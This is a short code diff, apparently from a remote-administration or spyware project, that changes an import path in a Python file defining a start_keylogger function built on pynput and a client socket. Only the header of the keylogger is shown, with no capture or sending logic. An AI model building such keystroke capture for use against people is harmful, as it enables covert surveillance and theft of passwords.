@@ -1,6 +1,6 @@
 from pynput import keyboard
 import threading
-from General.KetNoi_GiaoTiep import receive_response, send_command
+from XL_Chucnang.Connection import receive_response, send_command
 
 def start_keylogger(client_socket):
     keys_pressed = ""
